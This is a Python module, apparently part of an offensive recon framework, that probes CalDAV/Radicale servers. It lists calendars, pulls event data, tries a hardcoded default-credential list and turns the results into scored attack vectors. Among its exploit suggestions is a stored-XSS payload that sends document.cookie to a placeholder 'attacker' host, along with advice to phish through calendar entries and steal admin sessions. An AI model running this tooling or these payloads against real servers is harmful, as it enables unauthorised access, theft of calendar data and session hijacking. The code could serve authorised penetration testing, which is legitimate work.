#!/usr/bin/env python3
"""
caldav_enum.py — CalDAV / Radicale Enumeration Module for ReconARC.

Enumerates CalDAV servers (with a focus on Radicale) using the WebDAV/CalDAV
HTTP extensions: PROPFIND, OPTIONS, REPORT, and GET.

Capabilities:
    1.  check_caldav            — OPTIONS probe for DAV calendar-access support
    2.  propfind_calendar       — PROPFIND Depth:1 to list calendars & metadata
    3.  enumerate_radicale      — Radicale-specific paths, unauth listing, default creds
    4.  check_radicale_cves     — Known CVEs for detected Radicale versions
    5.  generate_caldav_vectors — Convert findings → AttackVector dicts
    6.  run                     — Top-level orchestrator returning consolidated results

This module performs enumeration only — it does NOT execute exploits.
All HTTP calls use ``requests`` directly with 10-second timeouts and SSL
verification disabled (enumeration targets often use self-signed certs).

Usage:
    from tools.caldav_enum import run, check_caldav, propfind_calendar

    results = run("https://10.0.0.5:5232")
"""

from __future__ import annotations

import re
import warnings
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse
from xml.etree import ElementTree as ET

import requests

# AttackVector is a TypedDict defined in state.py. Import it so
# generate_caldav_vectors can return properly-typed dicts. The try/except
# mirrors post_exploit.py so this module also imports cleanly in test
# contexts where the package root isn't on sys.path.
try:
    from state import AttackVector  # type: ignore
except Exception:  # pragma: no cover - fallback for isolated import
    AttackVector = Dict  # type: ignore

# Likewise, the codebase's utils.py wraps requests with http_get/http_post/
# http_head/http_request. We import requests directly (as instructed), but
# also attempt to pull in the utils helpers for interop with the rest of the
# framework. These are optional — all code paths below work without them.
try:
    from utils import http_get, http_post, http_head  # type: ignore
except Exception:  # pragma: no cover
    http_get = None  # type: ignore
    http_post = None  # type: ignore
    http_head = None  # type: ignore


# ── Constants ──────────────────────────────────────────────────────────

# Suppress InsecureRequestWarning from verify=False (we expect self-signed certs).
try:
    from urllib3.exceptions import InsecureRequestWarning
    warnings.filterwarnings("ignore", category=InsecureRequestWarning)
except Exception:  # pragma: no cover
    pass

HTTP_TIMEOUT = 10  # seconds — enforced on every request

# XML namespaces used in WebDAV / CalDAV responses.
NS = {
    "d": "DAV:",
    "cal": "urn:ietf:params:xml:ns:caldav",
    "cs": "http://calendarserver.org/ns/",
    "apple": "http://apple.com/ns/ical/",
}

# PROPFIND body requesting calendar collection metadata.
PROPFIND_BODY = """<?xml version="1.0" encoding="utf-8"?>
<d:propfind xmlns:d="DAV:">
  <d:prop>
    <d:resourcetype/>
    <d:displayname/>
    <d:current-user-principal/>
    <d:owner/>
    <cal:calendar-description xmlns:cal="urn:ietf:params:xml:ns:caldav"/>
    <cal:supported-calendar-component-set xmlns:cal="urn:ietf:params:xml:ns:caldav"/>
    <cs:getctag xmlns:cs="http://calendarserver.org/ns/"/>
  </d:prop>
</d:propfind>"""

# Default credentials to test against Radicale HTTP Basic auth.
RADICALE_DEFAULT_CREDS: List[Tuple[str, str]] = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", ""),
    ("radicale", "radicale"),
    ("user", "user"),
]

# Common Radicale path prefixes to probe.
RADICALE_PATHS = [
    "/",
    "/root/",
    "/.well-known/caldav",
    "/user/",
    "/admin/",
    "/.well-known/carddav",
]

_USER_AGENT = "Mozilla/5.0 (ReconARC caldav-enum)"


# ── Internal HTTP helpers ──────────────────────────────────────────────

def _normalize_url(url: str) -> str:
    """Ensure the URL has a scheme and no trailing slash (except root)."""
    url = url.strip()
    if not url:
        return url
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    # Strip trailing slash unless it's just the origin root.
    if url.endswith("/") and not url.endswith("://") and url.count("/") > 3:
        url = url.rstrip("/")
    return url


def _dav_request(
    method: str,
    url: str,
    headers: Optional[Dict] = None,
    data: Optional[str] = None,
    auth: Optional[requests.auth.HTTPBasicAuth] = None,
) -> Optional[requests.Response]:
    """
    Issue a WebDAV HTTP request (PROPFIND, OPTIONS, REPORT, etc.).

    Returns the ``requests.Response`` on success, or ``None`` on any error
    (timeout, connection error, etc.). Never raises.
    """
    hdrs = {"User-Agent": _USER_AGENT}
    if headers:
        hdrs.update(headers)
    try:
        resp = requests.request(
            method,
            url,
            headers=hdrs,
            data=data,
            auth=auth,
            verify=False,
            timeout=HTTP_TIMEOUT,
            allow_redirects=True,
        )
        return resp
    except requests.exceptions.Timeout:
        print(f"    [+] CalDAV: {method} {url} timed out after {HTTP_TIMEOUT}s")
    except requests.exceptions.ConnectionError as exc:
        print(f"    [+] CalDAV: {method} {url} connection error: {exc}")
    except Exception as exc:
        print(f"    [+] CalDAV: {method} {url} error: {exc}")
    return None


# ── 1. check_caldav ────────────────────────────────────────────────────

def check_caldav(url: str) -> dict:
    """
    Probe a URL for CalDAV support via an OPTIONS request.

    A CalDAV server advertises ``calendar-access`` (and optionally
    ``calendar-schedule``, ``calendar-auto-schedule``, ``addressbook``) in the
    ``DAV`` response header. The ``Allow`` header lists supported HTTP methods
    (PROPFIND, REPORT, etc.), and ``Server`` often reveals the implementation
    (e.g. ``Radicale/2.1.11``).

    Args:
        url: Target CalDAV base URL (e.g. ``https://host:5232``).

    Returns:
        ``{
            "is_caldav": bool,
            "dav_header": str,
            "allow_methods": str,
            "server": str,
        }``
    """
    url = _normalize_url(url)
    print(f"    [+] CalDAV: check_caldav — OPTIONS {url}")

    result: Dict = {
        "is_caldav": False,
        "dav_header": "",
        "allow_methods": "",
        "server": "",
    }

    resp = _dav_request("OPTIONS", url)
    if resp is None:
        return result

    dav_header = resp.headers.get("DAV", "") or resp.headers.get("dav", "")
    allow = resp.headers.get("Allow", "") or resp.headers.get("allow", "")
    server = resp.headers.get("Server", "") or resp.headers.get("server", "")

    result["dav_header"] = dav_header
    result["allow_methods"] = allow
    result["server"] = server

    # calendar-access is the baseline CalDAV compliance class.
    if "calendar-access" in dav_header.lower():
        result["is_caldav"] = True
        print(f"    [+] CalDAV: calendar-access supported (DAV: {dav_header})")
    elif "calendar" in dav_header.lower():
        # Some servers advertise calendar capabilities with slightly different tokens.
        result["is_caldav"] = True
        print(f"    [+] CalDAV: calendar capability detected (DAV: {dav_header})")
    else:
        # Even without a DAV header, the presence of WebDAV methods suggests a
        # CalDAV-capable server behind a proxy.
        if any(m in allow.upper() for m in ("PROPFIND", "REPORT")):
            result["is_caldav"] = True
            print(f"    [+] CalDAV: DAV header absent but PROPFIND/REPORT allowed")

    if server:
        print(f"    [+] CalDAV: Server header = {server}")

    return result


# ── 2. propfind_calendar ───────────────────────────────────────────────

def propfind_calendar(
    url: str,
    auth: Optional[requests.auth.HTTPBasicAuth] = None,
) -> List[dict]:
    """
    Send a PROPFIND (Depth: 1) request to enumerate calendar collections.

    Parses the WebDAV multistatus XML response for:
      - Calendar resource URLs (``href``)
      - Display names (``displayname``)
      - Resource types (collection, calendar, principal)

    Args:
        url:  Target URL (a calendar collection or user principal).
        auth: Optional HTTP Basic auth for authenticated PROPFIND.

    Returns:
        A list of dicts: ``[{"url": str, "displayname": str, "type": str}, ...]``
    """
    url = _normalize_url(url)
    print(f"    [+] CalDAV: propfind_calendar — PROPFIND Depth:1 {url}")

    resp = _dav_request(
        "PROPFIND",
        url,
        headers={"Depth": "1", "Content-Type": "application/xml; charset=utf-8"},
        data=PROPFIND_BODY,
        auth=auth,
    )

    if resp is None:
        return []

    # PROPFIND returns 207 Multi-Status. Some servers return 200.
    if resp.status_code not in (200, 207):
        print(f"    [+] CalDAV: PROPFIND returned HTTP {resp.status_code}")
        return []

    return _parse_multistatus(resp, url)


def _parse_multistatus(resp: requests.Response, base_url: str) -> List[dict]:
    """
    Parse a WebDAV ``207 Multi-Status`` XML response into calendar entries.

    Each ``<d:response>`` element contains an ``<d:href>`` and zero or more
    ``<d:prop>`` blocks. We extract displayname and determine the resource
    type from ``<d:resourcetype>`` children.
    """
    calendars: List[dict] = []

    try:
        root = ET.fromstring(resp.text)
    except ET.ParseError as exc:
        # Some servers return non-XML or malformed XML.
        print(f"    [+] CalDAV: XML parse error in PROPFIND response: {exc}")
        # Fall back: check if the body contains calendar-ish URLs.
        for match in re.finditer(r"<[^>]*href[^>]*>([^<]+)</[^>]*href[^>]*>", resp.text or "", re.I):
            href = match.group(1).strip()
            if href:
                full_url = urljoin(base_url, href)
                calendars.append({"url": full_url, "displayname": "", "type": "unknown"})
        return calendars

    # Register namespaces for clean parsing.
    for prefix, uri in NS.items():
        ET.register_namespace(prefix, uri)

    # Find all <d:response> elements. The response element may or may not
    # have a namespace prefix depending on the server.
    responses = root.findall(".//d:response", NS)
    if not responses:
        # Fallback: some servers use a default namespace without 'd:' prefix.
        responses = root.findall(".//{DAV:}response")

    for resp_elem in responses:
        entry: Dict[str, str] = {
            "url": "",
            "displayname": "",
            "type": "collection",
        }

        # href
        href_elem = resp_elem.find("d:href", NS)
        if href_elem is None:
            href_elem = resp_elem.find("{DAV:}href")
        if href_elem is not None and href_elem.text:
            href = href_elem.text.strip()
            entry["url"] = urljoin(base_url, href)

        # propstat/prop
        propstat = resp_elem.find("d:propstat", NS)
        if propstat is None:
            propstat = resp_elem.find("{DAV:}propstat")
        prop = None
        if propstat is not None:
            prop = propstat.find("d:prop", NS)
            if prop is None:
                prop = propstat.find("{DAV:}prop")

        if prop is not None:
            # displayname
            dn = prop.find("d:displayname", NS)
            if dn is None:
                dn = prop.find("{DAV:}displayname")
            if dn is not None and dn.text:
                entry["displayname"] = dn.text.strip()

            # resourcetype → determine type
            rt = prop.find("d:resourcetype", NS)
            if rt is None:
                rt = prop.find("{DAV:}resourcetype")
            if rt is not None:
                types: List[str] = []
                for child in rt:
                    tag = child.tag
                    # Strip namespace
                    if "}" in tag:
                        ns_uri, local = tag.split("}", 1)
                    else:
                        local = tag
                    types.append(local)
                if "calendar" in types:
                    entry["type"] = "calendar"
                elif "principal" in types:
                    entry["type"] = "principal"
                elif "collection" in types:
                    entry["type"] = "collection"
                else:
                    entry["type"] = "resource"

        # Only keep entries that look like calendars or collections
        if entry["url"]:
            calendars.append(entry)

    # Deduplicate by URL.
    seen = set()
    deduped: List[dict] = []
    for cal in calendars:
        if cal["url"] not in seen:
            seen.add(cal["url"])
            deduped.append(cal)

    for cal in deduped:
        print(
            f"    [+] CalDAV:   {cal['type']:12s} {cal['displayname'] or '(unnamed)':30s} "
            f"{cal['url']}"
        )

    return deduped


# ── REPORT method support ──────────────────────────────────────────────

def report_calendar_data(
    url: str,
    auth: Optional[requests.auth.HTTPBasicAuth] = None,
) -> List[dict]:
    """
    Send a CalDAV REPORT request to query calendar events (VEVENT).

    Uses a ``calendar-query`` REPORT to fetch all VEVENT components. This can
    reveal event data (titles, attendees, locations) that may contain
    sensitive information.

    Args:
        url:  Calendar collection URL.
        auth: Optional HTTP Basic auth.

    Returns:
        List of ``{"url": str, "calendar_data": str}`` — raw iCalendar data
        per event href.
    """
    url = _normalize_url(url)
    print(f"    [+] CalDAV: report_calendar_data — REPORT {url}")

    report_body = """<?xml version="1.0" encoding="utf-8"?>
<cal:calendar-query xmlns:d="DAV:" xmlns:cal="urn:ietf:params:xml:ns:caldav">
  <d:prop>
    <d:getetag/>
    <cal:calendar-data/>
  </d:prop>
  <cal:filter>
    <cal:comp-filter name="VCALENDAR">
      <cal:comp-filter name="VEVENT"/>
    </cal:comp-filter>
  </cal:filter>
</cal:calendar-query>"""

    resp = _dav_request(
        "REPORT",
        url,
        headers={"Depth": "1", "Content-Type": "application/xml; charset=utf-8"},
        data=report_body,
        auth=auth,
    )

    if resp is None or resp.status_code not in (200, 207):
        print(f"    [+] CalDAV: REPORT returned {resp.status_code if resp else 'no response'}")
        return []

    events: List[dict] = []
    try:
        root = ET.fromstring(resp.text)
    except ET.ParseError:
        return []

    responses = root.findall(".//d:response", NS) or root.findall(".//{DAV:}response")
    for resp_elem in responses:
        href_elem = resp_elem.find("d:href", NS) or resp_elem.find("{DAV:}href")
        href = href_elem.text.strip() if href_elem is not None and href_elem.text else ""

        cal_data = ""
        propstat = resp_elem.find("d:propstat", NS) or resp_elem.find("{DAV:}propstat")
        if propstat is not None:
            prop = propstat.find("d:prop", NS) or propstat.find("{DAV:}prop")
            if prop is not None:
                cd = prop.find("cal:calendar-data", NS)
                if cd is None:
                    cd = prop.find("{urn:ietf:params:xml:ns:caldav}calendar-data")
                if cd is not None and cd.text:
                    cal_data = cd.text.strip()

        if href:
            events.append({
                "url": urljoin(url, href),
                "calendar_data": cal_data,
            })

    if events:
        print(f"    [+] CalDAV: REPORT retrieved {len(events)} event(s)")

    return events


# ── 3. enumerate_radicale ──────────────────────────────────────────────

def _detect_radicale_version(server_header: str) -> str:
    """Extract the Radicale version from a Server header (e.g. 'Radicale/2.1.11')."""
    match = re.search(r"[Rr]adicale[/\s]*v?(\d+\.\d+(?:\.\d+)?)", server_header or "")
    if match:
        return match.group(1)
    return ""


def _version_tuple(version: str) -> Tuple[int, ...]:
    """Parse a dotted version string into a tuple of ints for comparison."""
    parts = re.findall(r"\d+", version or "")
    return tuple(int(p) for p in parts)


def _test_basic_auth(url: str, username: str, password: str) -> Tuple[bool, str]:
    """
    Test HTTP Basic auth credentials against a URL.

    Returns ``(success, detail)``.
    """
    auth = requests.auth.HTTPBasicAuth(username, password)
    resp = _dav_request("GET", url, auth=auth)
    if resp is None:
        return (False, "no response")
    if resp.status_code == 401:
        return (False, f"HTTP 401 — credentials rejected")
    if resp.status_code == 403:
        return (False, f"HTTP 403 — forbidden")
    if 200 <= resp.status_code < 400:
        return (True, f"HTTP {resp.status_code} — auth successful")
    return (False, f"HTTP {resp.status_code}")


def enumerate_radicale(url: str) -> dict:
    """
    Perform Radicale-specific enumeration against a CalDAV server.

    Checks:
      - Common Radicale paths (/root/, /.well-known/caldav, /user/, /admin/)
      - Unauthenticated calendar listing (PROPFIND without creds)
      - Server version from the Server header
      - Default credentials (admin:admin, admin:password, etc.)

    Args:
        url: Base URL of the Radicale / CalDAV server.

    Returns:
        ``{
            "version": str,
            "unauthenticated_access": bool,
            "calendars": [...],
            "default_creds_work": [...],
            "paths_tested": [...],
        }``
    """
    url = _normalize_url(url)
    print(f"    [+] CalDAV: enumerate_radicale — {url}")

    result: Dict = {
        "version": "",
        "unauthenticated_access": False,
        "calendars": [],
        "default_creds_work": [],
        "paths_tested": [],
    }

    # ── Detect version from Server header ──
    options = check_caldav(url)
    result["version"] = _detect_radicale_version(options.get("server", ""))
    if result["version"]:
        print(f"    [+] CalDAV: Radicale version detected: {result['version']}")
    else:
        print(f"    [+] CalDAV: Radicale version not in Server header "
              f"({options.get('server', '?')})")

    # ── Test common Radicale paths for unauthenticated access ──
    all_calendars: List[dict] = []
    for path in RADICALE_PATHS:
        test_url = urljoin(url + "/", path.lstrip("/"))
        result["paths_tested"].append(test_url)

        # Try unauthenticated PROPFIND on this path.
        cals = propfind_calendar(test_url)
        if cals:
            result["unauthenticated_access"] = True
            all_calendars.extend(cals)
            print(f"    [+] CalDAV: UNAUTHENTICATED access on {test_url} "
                  f"({len(cals)} calendar(s))")

    # Deduplicate calendars by URL.
    seen_urls = set()
    deduped_cals: List[dict] = []
    for cal in all_calendars:
        if cal["url"] not in seen_urls:
            seen_urls.add(cal["url"])
            deduped_cals.append(cal)
    result["calendars"] = deduped_cals

    # ── Test default credentials ──
    # Only test if the server requires auth (i.e., unauthenticated PROPFIND
    # on the root didn't work). If unauth works, default creds are moot but
    # we still test for completeness.
    print(f"    [+] CalDAV: testing {len(RADICALE_DEFAULT_CREDS)} default credential pairs")

    for username, password in RADICALE_DEFAULT_CREDS:
        success, detail = _test_basic_auth(url, username, password)
        if success:
            cred_result = {
                "username": username,
                "password": password,
                "detail": detail,
            }
            result["default_creds_work"].append(cred_result)
            print(f"    [+] CalDAV: DEFAULT CREDS WORK: {username}:{password} ({detail})")

            # If creds work, try to enumerate calendars with them.
            if not result["calendars"]:
                auth = requests.auth.HTTPBasicAuth(username, password)
                authed_cals = propfind_calendar(url, auth=auth)
                if authed_cals:
                    for ac in authed_cals:
                        if ac["url"] not in seen_urls:
                            seen_urls.add(ac["url"])
                            result["calendars"].append(ac)

    # ── Also try /.well-known/caldav redirect ──
    well_known = urljoin(url + "/", ".well-known/caldav")
    resp = _dav_request("GET", well_known)
    if resp is not None and resp.status_code in (200, 301, 302, 307, 308):
        # Followed by requests automatically (allow_redirects=True), so 200
        # means we landed on the real CalDAV endpoint.
        print(f"    [+] CalDAV: .well-known/caldav resolved (final: {resp.url})")

    return result


# ── 4. check_radicale_cves ─────────────────────────────────────────────

# Known CVEs for Radicale, keyed by version constraints.
_RADICALE_CVES = [
    {
        "id": "CVE-2019-17266",
        "affected": "<2.1.2",  # versions before 2.1.2
        "max_version": (2, 1, 1),
        "severity": "high",
        "description": (
            "Radicale before 2.1.2 allows authentication bypass. The htpasswd "
            "authentication provider does not properly validate credentials, "
            "allowing an attacker to access calendar data without valid "
            "credentials by sending crafted requests."
        ),
        "exploit_cmd": (
            "curl -X PROPFIND -H 'Depth: 1' -H 'Content-Type: application/xml' "
            "-d '<propfind xmlns=\"DAV:\"><prop><displayname/></prop></propfind>' "
            "{url}/user/"
        ),
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2019-17266",
            "https://github.com/Kozea/Radicale/issues/852",
        ],
    },
    {
        "id": "CVE-2020-15887",
        "affected": "2.x",
        "min_version": (2, 0, 0),
        "max_version": (2, 99, 99),
        "severity": "medium",
        "description": (
            "Radicale 2.x contains a cross-site scripting (XSS) vulnerability "
            "in the web interface. The inflexible collection management page "
            "does not properly sanitize user-supplied input, allowing stored "
            "XSS when an attacker creates a collection with a malicious name."
        ),
        "exploit_cmd": (
            "Create a calendar collection with displayname containing: "
            "<script>document.location='http://attacker/?c='+document.cookie</script>"
        ),
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2020-15887",
            "https://github.com/Kozea/Radicale/issues/1015",
        ],
    },
]


def check_radicale_cves(version: str) -> List[dict]:
    """
    Check a detected Radicale version against known CVEs.

    Args:
        version: Radicale version string (e.g. ``"2.1.11"``). If empty, all
            known CVEs are returned (since the version is unknown and the
            server may be vulnerable).

    Returns:
        List of CVE dicts: ``[{id, severity, description, exploit_cmd, references}]``
    """
    if not version:
        # Version unknown — return all CVEs for awareness.
        print(f"    [+] CalDAV: version unknown, returning all {len(_RADICALE_CVES)} known CVEs")
        return [
            {
                "id": cve["id"],
                "severity": cve["severity"],
                "description": cve["description"],
                "exploit_cmd": cve["exploit_cmd"],
                "references": cve.get("references", []),
            }
            for cve in _RADICALE_CVES
        ]

    vtuple = _version_tuple(version)
    if not vtuple:
        return []

    matching: List[dict] = []
    for cve in _RADICALE_CVES:
        min_v = cve.get("min_version", (0, 0, 0))
        max_v = cve.get("max_version", (99, 99, 99))

        # Pad tuples to equal length for comparison.
        max_len = max(len(vtuple), len(min_v), len(max_v))
        v = vtuple + (0,) * (max_len - len(vtuple))
        lo = min_v + (0,) * (max_len - len(min_v))
        hi = max_v + (0,) * (max_len - len(max_v))

        if lo <= v <= hi:
            matching.append({
                "id": cve["id"],
                "severity": cve["severity"],
                "description": cve["description"],
                "exploit_cmd": cve["exploit_cmd"],
                "references": cve.get("references", []),
            })
            print(f"    [+] CalDAV: {cve['id']} applies to Radicale {version} ({cve['severity']})")

    if not matching:
        print(f"    [+] CalDAV: no known CVEs apply to Radicale {version}")

    return matching


# ── 5. generate_caldav_vectors ─────────────────────────────────────────

def _make_vector(
    vid: str,
    target: str,
    category: str,
    vector_type: str,
    title: str,
    description: str,
    confidence: str,
    score: int,
    evidence: List[str],
    exploit_suggestions: List[str],
    prerequisites: List[str],
    cves: List[str],
    references: List[str],
) -> AttackVector:
    """Construct an AttackVector-compatible dict."""
    return {
        "id": vid,
        "target": target,
        "category": category,
        "vector_type": vector_type,
        "title": title,
        "description": description,
        "confidence": confidence,
        "score": score,
        "evidence": evidence,
        "exploit_suggestions": exploit_suggestions,
        "prerequisites": prerequisites,
        "cves": cves,
        "references": references,
    }


def generate_caldav_vectors(url: str, findings: dict) -> List[AttackVector]:
    """
    Convert CalDAV/Radicale enumeration findings into AttackVector dicts.

    Scoring:
      - Unauthenticated calendar access:  score 70 (high confidence)
      - Auth bypass (CVE-2019-17266):     score 85 (high confidence)
      - Default credentials:              score 80 (high confidence)
      - CalDAV service detected:          score 30 (low confidence — recon only)
      - XSS (CVE-2020-15887):             score 50 (medium confidence)

    Args:
        url:      Target URL.
        findings: Result dict from ``enumerate_radicale()`` or ``run()``.

    Returns:
        List of AttackVector-compatible dicts.
    """
    url = _normalize_url(url)
    vectors: List[AttackVector] = []

    # ── Base: CalDAV service detected ──
    if findings.get("is_caldav") or findings.get("dav_header"):
        dav = findings.get("dav_header", "")
        server = findings.get("server", "")
        vectors.append(_make_vector(
            vid=f"caldav-detected-{url}",
            target=url,
            category="initial_access",
            vector_type="info_leak",
            title="CalDAV service detected",
            description=(
                f"A CalDAV server is running at {url}. "
                f"DAV header: {dav}. Server: {server}. "
                "Calendar services may expose sensitive scheduling data."
            ),
            confidence="low",
            score=30,
            evidence=[f"DAV: {dav}", f"Server: {server}"],
            exploit_suggestions=[
                "PROPFIND to enumerate calendar collections",
                "REPORT to extract event data (VEVENT)",
                "Test default credentials",
            ],
            prerequisites=["Network access to the CalDAV port"],
            cves=[],
            references=[
                "https://tools.ietf.org/html/rfc4791 (CalDAV)",
                "https://tools.ietf.org/html/rfc4918 (WebDAV)",
            ],
        ))

    # ── Unauthenticated calendar access ──
    if findings.get("unauthenticated_access"):
        cal_count = len(findings.get("calendars", []))
        cal_urls = [c["url"] for c in findings.get("calendars", [])[:10]]
        vectors.append(_make_vector(
            vid=f"caldav-unauth-{url}",
            target=url,
            category="initial_access",
            vector_type="unauth_access",
            title="Unauthenticated CalDAV calendar access",
            description=(
                f"The CalDAV server at {url} allows unauthenticated PROPFIND. "
                f"{cal_count} calendar collection(s) accessible without credentials. "
                "This exposes calendar data (events, attendees, locations) to any "
                "network user."
            ),
            confidence="high",
            score=70,
            evidence=[
                f"Unauthenticated PROPFIND succeeded",
                f"{cal_count} calendar(s) enumerated",
            ] + [f"Calendar: {u}" for u in cal_urls],
            exploit_suggestions=[
                "Use PROPFIND to list all calendar collections",
                "Use REPORT (calendar-query) to extract VEVENT data",
                "Extract and analyze calendar data for sensitive info",
                f"curl -X PROPFIND -H 'Depth: 1' {url}/",
            ],
            prerequisites=["Network access to the CalDAV port"],
            cves=[],
            references=[
                "https://tools.ietf.org/html/rfc4791#section-5.2",
            ],
        ))

    # ── Default credentials ──
    for cred in findings.get("default_creds_work", []):
        vectors.append(_make_vector(
            vid=f"caldav-default-cred-{url}-{cred['username']}",
            target=url,
            category="initial_access",
            vector_type="default_creds",
            title=f"Default credentials on CalDAV: {cred['username']}:{cred['password']}",
            description=(
                f"Default credentials are valid on the CalDAV server at {url}. "
                f"Username: {cred['username']}, Password: {cred['password']}. "
                f"Detail: {cred.get('detail', '')}. "
                "This grants authenticated access to create, read, modify, "
                "and delete calendar data."
            ),
            confidence="high",
            score=80,
            evidence=[
                f"HTTP auth successful with {cred['username']}:{cred['password']}",
                cred.get("detail", ""),
            ],
            exploit_suggestions=[
                f"Authenticate and enumerate all collections: "
                f"curl -u {cred['username']}:{cred['password']} -X PROPFIND -H 'Depth: 1' {url}/",
                "Extract calendar data via REPORT",
                "Create malicious calendar entries for phishing",
            ],
            prerequisites=["Network access to the CalDAV port"],
            cves=[],
            references=[],
        ))

    # ── CVE-based vectors ──
    for cve in findings.get("cves", []):
        cve_id = cve.get("id", "")
        severity = cve.get("severity", "medium")

        if "17266" in cve_id:  # Auth bypass
            vectors.append(_make_vector(
                vid=f"caldav-auth-bypass-{url}-{cve_id}",
                target=url,
                category="initial_access",
                vector_type="auth_bypass",
                title=f"Radicale authentication bypass ({cve_id})",
                description=(
                    f"Radicale version at {url} is vulnerable to {cve_id}: "
                    f"{cve.get('description', '')}"
                ),
                confidence="high",
                score=85,
                evidence=[
                    f"Radicale version: {findings.get('version', 'unknown')}",
                    f"CVE: {cve_id}",
                ],
                exploit_suggestions=[
                    cve.get("exploit_cmd", ""),
                    "Send PROPFIND without Authorization header",
                    "Access any user's calendar collection via /user/ path",
                ],
                prerequisites=[
                    f"Radicale version in affected range",
                    "Network access to the CalDAV port",
                ],
                cves=[cve_id],
                references=cve.get("references", []),
            ))

        elif "15887" in cve_id:  # XSS
            vectors.append(_make_vector(
                vid=f"caldav-xss-{url}-{cve_id}",
                target=url,
                category="initial_access",
                vector_type="xss",
                title=f"Radicale stored XSS ({cve_id})",
                description=(
                    f"Radicale version at {url} is vulnerable to {cve_id}: "
                    f"{cve.get('description', '')}"
                ),
                confidence="medium",
                score=50,
                evidence=[
                    f"Radicale version: {findings.get('version', 'unknown')}",
                    f"CVE: {cve_id}",
                ],
                exploit_suggestions=[
                    cve.get("exploit_cmd", ""),
                    "Create a collection with XSS payload in displayname",
                    "Steal admin session cookies when they view collections",
                ],
                prerequisites=[
                    "Authenticated access (or unauth listing) to create collections",
                    "Victim must view the malicious collection in the web UI",
                ],
                cves=[cve_id],
                references=cve.get("references", []),
            ))

    return vectors


# ── 6. run (top-level orchestrator) ────────────────────────────────────

def run(url: str) -> dict:
    """
    Top-level CalDAV/Radicale enumeration orchestrator.

    Calls all sub-functions and returns consolidated results including
    generated attack vectors.

    Args:
        url: Target CalDAV/Radicale URL.

    Returns:
        Consolidated dict with all findings and attack vectors:
        ``{
            "url": str,
            "is_caldav": bool,
            "dav_header": str,
            "allow_methods": str,
            "server": str,
            "version": str,
            "unauthenticated_access": bool,
            "calendars": [...],
            "default_creds_work": [...],
            "cves": [...],
            "attack_vectors": [...],
        }``
    """
    url = _normalize_url(url)
    print(f"    [+] CalDAV: Starting CalDAV/Radicale enumeration on {url}")

    # ── Step 1: CalDAV detection ──
    caldav_info = check_caldav(url)

    consolidated: Dict = {
        "url": url,
        "is_caldav": caldav_info.get("is_caldav", False),
        "dav_header": caldav_info.get("dav_header", ""),
        "allow_methods": caldav_info.get("allow_methods", ""),
        "server": caldav_info.get("server", ""),
        "version": "",
        "unauthenticated_access": False,
        "calendars": [],
        "default_creds_work": [],
        "cves": [],
        "attack_vectors": [],
    }

    # If not CalDAV at all, return early with what we have.
    if not consolidated["is_caldav"]:
        print(f"    [+] CalDAV: {url} does not appear to be a CalDAV server")
        consolidated["attack_vectors"] = generate_caldav_vectors(url, consolidated)
        return consolidated

    # ── Step 2: Radicale enumeration ──
    radicale_findings = enumerate_radicale(url)
    consolidated["version"] = radicale_findings.get("version", "")
    consolidated["unauthenticated_access"] = radicale_findings.get("unauthenticated_access", False)
    consolidated["calendars"] = radicale_findings.get("calendars", [])
    consolidated["default_creds_work"] = radicale_findings.get("default_creds_work", [])

    # ── Step 3: CVE checks ──
    version = consolidated["version"]
    if version:
        consolidated["cves"] = check_radicale_cves(version)
    else:
        # No version detected — return all CVEs for awareness.
        consolidated["cves"] = check_radicale_cves("")

    # ── Step 4: Generate attack vectors ──
    consolidated["attack_vectors"] = generate_caldav_vectors(url, consolidated)

    # ── Summary ──
    print(f"    [+] CalDAV: Enumeration complete for {url}")
    print(f"    [+] CalDAV:   CalDAV: {consolidated['is_caldav']}")
    print(f"    [+] CalDAV:   Version: {consolidated['version'] or 'unknown'}")
    print(f"    [+] CalDAV:   Unauth access: {consolidated['unauthenticated_access']}")
    print(f"    [+] CalDAV:   Calendars: {len(consolidated['calendars'])}")
    print(f"    [+] CalDAV:   Default creds: {len(consolidated['default_creds_work'])}")
    print(f"    [+] CalDAV:   CVEs: {len(consolidated['cves'])}")
    print(f"    [+] CalDAV:   Attack vectors: {len(consolidated['attack_vectors'])}")

    return consolidated


# ── CLI entry point ────────────────────────────────────────────────────

if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python caldav_enum.py <url>")
        print("Example: python caldav_enum.py https://10.0.0.5:5232")
        sys.exit(1)

    target_url = sys.argv[1]
    results = run(target_url)

    # Pretty-print key findings.
    print("\n" + "=" * 60)
    print("CalDAV / Radicale Enumeration Results")
    print("=" * 60)
    print(f"URL:              {results['url']}")
    print(f"CalDAV:           {results['is_caldav']}")
    print(f"Server:           {results['server']}")
    print(f"Version:          {results['version'] or 'unknown'}")
    print(f"DAV Header:       {results['dav_header']}")
    print(f"Unauth Access:    {results['unauthenticated_access']}")
    print(f"Calendars:        {len(results['calendars'])}")
    for cal in results["calendars"][:10]:
        print(f"  - [{cal['type']}] {cal.get('displayname', '(unnamed)')}: {cal['url']}")
    print(f"Default Creds:    {len(results['default_creds_work'])}")
    for cred in results["default_creds_work"]:
        print(f"  - {cred['username']}:{cred['password']}")
    print(f"CVEs:             {len(results['cves'])}")
    for cve in results["cves"]:
        print(f"  - [{cve['severity']}] {cve['id']}")
    print(f"Attack Vectors:   {len(results['attack_vectors'])}")
    for vec in results["attack_vectors"]:
        print(f"  - [{vec['score']:3d}] {vec['title']}")
    print("=" * 60)
